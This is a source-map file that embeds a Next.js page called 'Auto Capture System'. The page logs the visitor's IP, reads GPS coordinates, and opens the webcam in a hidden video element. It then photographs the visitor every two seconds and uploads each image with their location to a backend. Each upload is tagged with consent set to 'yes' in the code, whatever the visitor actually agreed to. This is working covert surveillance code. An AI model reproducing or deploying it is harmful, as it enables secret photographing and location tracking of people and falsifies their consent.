{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 10, "column": 0}, "map": {"version":3,"sources":["file:///E:/personal/fun/consent-trace-app/frontend/pages/index.tsx"],"sourcesContent":["import React, { useRef, useState } from \"react\";\r\n\r\nconst BACKEND = process.env.NEXT_PUBLIC_BACKEND || \"http://localhost:4000\";\r\n\r\nexport default function HomePage() {\r\n  const [loading, setLoading] = useState(false);\r\n  const [autoMode, setAutoMode] = useState(false);\r\n\r\n  const intervalRef = useRef<number | null>(null);\r\n  const videoRef = useRef<HTMLVideoElement>(null);\r\n  const [stream, setStream] = useState<MediaStream | null>(null);\r\n\r\n  // -------------------- TRACK IP --------------------\r\n  async function handleTrack() {\r\n    await fetch(`${BACKEND}/api/track`);\r\n  }\r\n\r\n  // -------------------- GPS --------------------\r\n  async function getGPS() {\r\n    return new Promise<GeolocationPosition | null>((resolve) => {\r\n      if (!navigator.geolocation) return resolve(null);\r\n\r\n      navigator.geolocation.getCurrentPosition(\r\n        (pos) => resolve(pos),\r\n        () => resolve(null)\r\n      );\r\n    });\r\n  }\r\n\r\n  // -------------------- CAMERA --------------------\r\n  async function openCamera(startAuto = false) {\r\n    try {\r\n      const s = await navigator.mediaDevices.getUserMedia({ video: true });\r\n      setStream(s);\r\n\r\n      if (videoRef.current) {\r\n        videoRef.current.srcObject = s;\r\n        await videoRef.current.play();\r\n      }\r\n\r\n      if (startAuto) startAutoCapture();\r\n    } catch (err) {\r\n      alert(\"Camera permission denied\");\r\n    }\r\n  }\r\n\r\n  // -------------------- TAKE PHOTO --------------------\r\n  async function takePhoto(silent = false) {\r\n    if (!videoRef.current) return;\r\n\r\n    const canvas = document.createElement(\"canvas\");\r\n    canvas.width = videoRef.current.videoWidth;\r\n    canvas.height = videoRef.current.videoHeight;\r\n    canvas.getContext(\"2d\")?.drawImage(videoRef.current, 0, 0);\r\n\r\n    const blob = await new Promise<Blob | null>((resolve) =>\r\n      canvas.toBlob(resolve, \"image/jpeg\", 0.9)\r\n    );\r\n\r\n    if (!blob) return;\r\n\r\n    const pos = await getGPS();\r\n    const fd = new FormData();\r\n\r\n    fd.append(\"photo\", blob);\r\n    fd.append(\"consent\", \"yes\");\r\n\r\n    if (pos) {\r\n      fd.append(\"latitude\", String(pos.coords.latitude));\r\n      fd.append(\"longitude\", String(pos.coords.longitude));\r\n    }\r\n\r\n    await fetch(`${BACKEND}/api/upload-photo`, {\r\n      method: \"POST\",\r\n      body: fd\r\n    });\r\n\r\n    // Stop camera only in manual mode\r\n    if (!silent && !autoMode && stream) {\r\n      stream.getTracks().forEach((t) => t.stop());\r\n      setStream(null);\r\n    }\r\n  }\r\n\r\n  // -------------------- AUTO CAPTURE --------------------\r\n  function startAutoCapture() {\r\n    if (autoMode) return;\r\n\r\n    setAutoMode(true);\r\n\r\n    intervalRef.current = window.setInterval(() => {\r\n      takePhoto(true);\r\n    }, 2000);\r\n  }\r\n\r\n  function stopAutoCapture() {\r\n    setAutoMode(false);\r\n\r\n    if (intervalRef.current !== null) {\r\n      clearInterval(intervalRef.current);\r\n      intervalRef.current = null;\r\n    }\r\n\r\n    if (stream) {\r\n      stream.getTracks().forEach((t) => t.stop());\r\n      setStream(null);\r\n    }\r\n  }\r\n\r\n  // -------------------- RUN ALL --------------------\r\n  async function runAll() {\r\n    setLoading(true);\r\n\r\n    await handleTrack();\r\n    await getGPS();\r\n    await openCamera(true);\r\n\r\n    // Take first photo instantly\r\n    setTimeout(() => takePhoto(true), 1000);\r\n\r\n    setLoading(false);\r\n  }\r\n\r\n  // -------------------- UI --------------------\r\n  const buttonStyle = {\r\n    padding: \"14px 28px\",\r\n    margin: \"10px\",\r\n    borderRadius: \"6px\",\r\n    fontSize: \"16px\",\r\n    cursor: \"pointer\",\r\n    border: \"none\",\r\n    color: \"white\"\r\n  };\r\n\r\n  return (\r\n    <main style={{ textAlign: \"center\", padding: 40 }}>\r\n      \r\n      <h1>Auto Capture System</h1>\r\n\r\n      <button\r\n        onClick={runAll}\r\n        style={{ ...buttonStyle, background: \"green\" }}\r\n        disabled={loading}\r\n      >\r\n        {loading ? \"Starting...\" : \"Run All\"}\r\n      </button>\r\n\r\n      {autoMode && (\r\n        <button\r\n          onClick={stopAutoCapture}\r\n          style={{ ...buttonStyle, background: \"red\" }}\r\n        >\r\n          Stop Auto Capture\r\n        </button>\r\n      )}\r\n\r\n      {/* ADMIN BUTTON */}\r\n      <button\r\n        onClick={() => window.open(\"/admin\", \"_blank\")}\r\n        style={{ ...buttonStyle, background: \"blue\" }}\r\n      >\r\n        Admin Panel\r\n      </button>\r\n\r\n      {/* Hidden camera stream */}\r\n      <video ref={videoRef} style={{ display: \"none\" }} />\r\n    </main>\r\n  );\r\n}\r\n"],"names":[],"mappings":"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"}}]
}